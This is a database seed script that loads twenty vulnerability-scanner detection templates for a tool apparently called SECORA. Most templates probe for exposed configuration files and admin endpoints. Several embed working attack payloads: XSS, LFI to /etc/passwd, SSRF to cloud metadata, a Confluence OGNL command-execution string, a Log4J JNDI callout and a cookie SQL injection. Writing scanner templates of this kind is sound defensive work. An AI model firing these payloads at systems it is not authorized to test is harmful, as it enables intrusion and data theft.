import { PrismaClient } from '@prisma/client';
const prisma = new PrismaClient();

const starterTemplates = [
    {
        name: 'Exposed .git directory',
        severity: 'HIGH',
        target: 'URL',
        yamlContent: `
id: exposed-git
info:
  name: Exposed Git Repository
  author: SECORA
  description: Detects exposed .git/config files which can leak sensitive source code and credentials.
  remediation: Deny public access to .git directories in web server configuration.
payloads:
  - ".git/config"
matchers:
  - type: status
    status: [200]
  - type: word
    words:
      - "[core]"
      - "repositoryformatversion"
`
    },
    {
        name: 'Spring Boot Actuator Env Exposure',
        severity: 'HIGH',
        target: 'URL',
        yamlContent: `
id: springboot-actuator-env
info:
  name: Spring Boot Actuator /env
  author: SECORA
  description: The Spring Boot Actuator /env endpoint is exposed, leaking environment variables.
payloads:
  - "actuator/env"
  - "env"
matchers:
  - type: status
    status: [200]
  - type: word
    words:
      - "activeProfiles"
      - "propertySources"
`
    },
    {
        name: 'Generic AWS Access Key Leak',
        severity: 'HIGH',
        target: 'URL',
        yamlContent: `
id: aws-key-leak
info:
  name: AWS Access Key Leak
  author: SECORA
  description: Detects AWS access keys exposed in the response body.
payloads:
  - ""
matchers:
  - type: regex
    regex: "(?i)AKIA[0-9A-Z]{16}"
`
    },
    {
        name: 'Basic Cross-Site Scripting (XSS) Prompt',
        severity: 'MEDIUM',
        target: 'URL',
        yamlContent: `
id: generic-xss-prompt
info:
  name: Reflected XSS Prompt
  author: SECORA
  description: Detects unescaped input reflected back into the response triggering a script prompt.
payloads:
  - "><script>prompt(1)</script>"
  - "'><script>prompt(1)</script>"
matchers:
  - type: word
    words:
      - "><script>prompt(1)</script>"
`
    },
    {
        name: 'Local File Inclusion (LFI) - /etc/passwd',
        severity: 'HIGH',
        target: 'URL',
        yamlContent: `
id: lfi-etc-passwd
info:
  name: Local File Inclusion
  author: SECORA
  description: Detects LFI reading the /etc/passwd file.
payloads:
  - "../../../../../../../../etc/passwd"
  - "/etc/passwd"
matchers:
  - type: regex
    regex: "root:.*:0:0:"
`
    },
    {
        name: 'Server-Side Request Forgery (SSRF) - AWS Metadata',
        severity: 'CRITICAL',
        target: 'URL',
        yamlContent: `
id: ssrf-aws-metadata
info:
  name: SSRF AWS Metadata
  author: SECORA
  description: Detects SSRF accessing the AWS metadata service.
payloads:
  - "http://169.254.169.254/latest/meta-data/"
matchers:
  - type: status
    status: [200]
  - type: word
    words:
      - "ami-id"
      - "instance-id"
      - "iam/"
`
    },
    {
        name: 'PHP phpinfo() Exposure',
        severity: 'MEDIUM',
        target: 'URL',
        yamlContent: `
id: phpinfo-exposure
info:
  name: phpinfo() Exposure
  author: SECORA
  description: Detects exposed phpinfo() pages which leak sensitive server configuration.
payloads:
  - "phpinfo.php"
  - "info.php"
matchers:
  - type: status
    status: [200]
  - type: word
    words:
      - "<title>phpinfo()</title>"
      - "PHP Version"
`
    },
    {
        name: 'Exposed Docker API',
        severity: 'CRITICAL',
        target: 'URL',
        yamlContent: `
id: docker-api-exposed
info:
  name: Docker API Exposure
  author: SECORA
  description: Unauthenticated Docker API exposure allowing remote container execution.
payloads:
  - "containers/json"
matchers:
  - type: status
    status: [200]
  - type: word
    words:
      - "Command"
      - "Created"
      - "Id"
      - "Image"
`
    },
    {
        name: 'Jira CVE-2021-26086 (Path Traversal)',
        severity: 'HIGH',
        target: 'URL',
        yamlContent: `
id: jira-cve-2021-26086
info:
  name: Jira Pre-Auth Path Traversal
  author: SECORA
  description: Jira Server and Data Center pre-auth path traversal vulnerability.
payloads:
  - "s/1/_/;/WEB-INF/web.xml"
  - "s/1/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties"
matchers:
  - type: status
    status: [200]
  - type: word
    words:
      - "<web-app"
      - "com.atlassian.jira"
`
    },
    {
        name: 'Confluence CVE-2022-26134 (Ognl RCE)',
        severity: 'CRITICAL',
        target: 'URL',
        yamlContent: `
id: confluence-cve-2022-26134
info:
  name: Confluence Pre-Auth RCE
  author: SECORA
  description: OGNL injection in Confluence Server and Data Center.
payloads:
  - "%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"
matchers:
  - type: status
    status: [302, 200]
  - type: regex
    regex: "(?i)uid=[0-9]+.*gid=[0-9]+"
`
    },
    {
        name: 'Exposed Jenkins Setup',
        severity: 'HIGH',
        target: 'URL',
        yamlContent: `
id: exposed-jenkins
info:
  name: Exposed Jenkins
  author: SECORA
  description: Jenkins instance is accessible without authentication.
payloads:
  - ""
matchers:
  - type: status
    status: [200]
  - type: word
    words:
      - "Jenkins"
      - "Manage Jenkins"
`
    },
    {
        name: 'Laravel .env Exposure',
        severity: 'HIGH',
        target: 'URL',
        yamlContent: `
id: laravel-env-exposure
info:
  name: Laravel Environment File Leak
  author: SECORA
  description: Detects exposed .env files common in misconfigured Laravel deployments.
payloads:
  - ".env"
matchers:
  - type: status
    status: [200]
  - type: word
    words:
      - "APP_ENV="
      - "APP_KEY="
`
    },
    {
        name: 'GraphQL Introspection Enabled',
        severity: 'MEDIUM',
        target: 'BODY',
        yamlContent: `
id: graphql-introspection
info:
  name: GraphQL Introspection
  author: SECORA
  description: GraphQL endpoint has schema introspection enabled, leaking the API structure.
payloads:
  - '{"query":"query { __schema { queryType { name } } }"}'
matchers:
  - type: status
    status: [200]
  - type: word
    words:
      - "__schema"
      - "queryType"
`
    },
    {
        name: 'Log4J JNDI Injection Header (CVE-2021-44228)',
        severity: 'CRITICAL',
        target: 'HEADER',
        yamlContent: `
id: log4j-jndi-header
info:
  name: Log4J Header Injection
  author: SECORA
  description: Injects Log4J JNDI payload into custom headers.
payloads:
  - "\${jndi:ldap://{{oast_payload}}}"
matchers:
  - type: word
    words:
      - "SECORA_CUSTOM_RULE_PLACEHOLDER"
`
    },
    {
        name: 'WordPress Config Backup Exposure',
        severity: 'HIGH',
        target: 'URL',
        yamlContent: `
id: wp-config-backup
info:
  name: WordPress Config Backup
  author: SECORA
  description: Detects backup copies of wp-config.php.
payloads:
  - "wp-config.php.bak"
  - "wp-config.php.save"
  - "wp-config.php~"
matchers:
  - type: status
    status: [200]
  - type: word
    words:
      - "DB_NAME"
      - "DB_PASSWORD"
`
    },
    {
        name: 'Kibana Unauthenticated Access',
        severity: 'HIGH',
        target: 'URL',
        yamlContent: `
id: kibana-unauth
info:
  name: Kibana Unauthenticated Access
  author: SECORA
  description: Kibana dashboard is exposed without authentication.
payloads:
  - "app/kibana"
matchers:
  - type: status
    status: [200]
  - type: word
    words:
      - "kibanaWelcomeLogo"
`
    },
    {
        name: 'Prometheus Metrics Exposure',
        severity: 'LOW',
        target: 'URL',
        yamlContent: `
id: prometheus-metrics
info:
  name: Prometheus Metrics
  author: SECORA
  description: Prometheus /metrics endpoint is public.
payloads:
  - "metrics"
matchers:
  - type: status
    status: [200]
  - type: word
    words:
      - "HELP"
      - "TYPE"
`
    },
    {
        name: 'Flask Debug Mode Enabled',
        severity: 'HIGH',
        target: 'URL',
        yamlContent: `
id: flask-debug-mode
info:
  name: Flask Debug Mode
  author: SECORA
  description: Flask debug mode is enabled, potentially allowing RCE via the interactive debugger.
payloads:
  - "non_existent_endpoint_for_flask_debug_12345"
matchers:
  - type: status
    status: [404, 500]
  - type: word
    words:
      - "werkzeug.debug"
      - "Traceback"
`
    },
    {
        name: 'Cookie based SQLi',
        severity: 'HIGH',
        target: 'COOKIE',
        yamlContent: `
id: cookie-sqli
info:
  name: Cookie SQL Injection
  author: SECORA
  description: Tests for basic SQL injection via cookie manipulation.
payloads:
  - "' OR 1=1--"
matchers:
  - type: word
    words:
      - "SQL syntax"
      - "mysql_fetch"
`
    },
    {
        name: 'Apache Server Status Exposure',
        severity: 'MEDIUM',
        target: 'URL',
        yamlContent: `
id: apache-server-status
info:
  name: Apache Server Status
  author: SECORA
  description: Apache server-status page is exposed.
payloads:
  - "server-status"
matchers:
  - type: status
    status: [200]
  - type: word
    words:
      - "Apache Server Status"
`
    }
];

async function main() {
    console.log("Seeding 20 custom templates into database...");
    
    // Clear existing templates to avoid duplicates
    await prisma.customTemplate.deleteMany({});
    
    let count = 0;
    for (const template of starterTemplates) {
        await prisma.customTemplate.create({
            data: template
        });
        count++;
    }
    console.log('✅ Successfully seeded ' + count + ' templates.');
}

main()
    .catch(e => {
        console.error(e);
        process.exit(1);
    })
    .finally(async () => {
        await prisma.$disconnect();
    });
